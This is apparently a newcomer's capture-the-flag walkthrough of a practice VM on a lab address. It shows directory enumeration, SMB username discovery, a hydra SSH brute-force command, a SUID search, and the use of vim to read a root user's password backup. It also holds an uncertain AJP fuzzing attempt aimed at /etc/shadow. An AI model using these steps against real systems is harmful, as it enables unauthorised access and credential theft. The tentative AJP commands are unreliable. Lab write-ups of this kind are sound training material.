After performing gobuster scan on the target ip with port 80. I found these notes in the following directory "http://192.168.56.101/development/"

Note from dev.txt 
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

```


Note from j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

```

As it was mentioned that j's hash is easy. I need to find the username in order to perform brute-force attack.

So, now we know that one of the port's are running SMB. I got the username after performing a enum4linux scan. j ---> jan.

Now, we got the username jan. 

	hydra -l jan -P /usr/share/wordlist/rockyou.txt <ip a> ssh


Now, we got a user shell. To get the root access we need to perform a privilege escallation.

command to check the file with root permissions: {find / -perm -4000  2>/dev/null}

And I found vim has the root access. So, I can open any file no matter what the permissions are. So, opened an root user kay's pass.bak and found his password.

		heresareallystrongpasswordthatfollowsthepasswordpolicy$$

Logged as kay with password -----> su kay

sudo su (got the root access)

```
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!

Another method: 


There's a protocol called ajp13 (Apache Jserv 1.3) and it got an exploit where we can get a connection.

Note: I'm not sure for now. The below commands are for the same.

> genericfuzz 2 "HTTP/1.1" "/test.html" "192.168.56.101" "192.168.56.101" "server.name.test" 8009 false "Cookie:AAAA=BBBB" "secret:FUZZ" /etc/shadow

> forwardrequest 2 "HTTP/1.1" "/api/" 127.0.0.1 localhost porto 8009 false "Cookie:AAAA=BBBB" ""
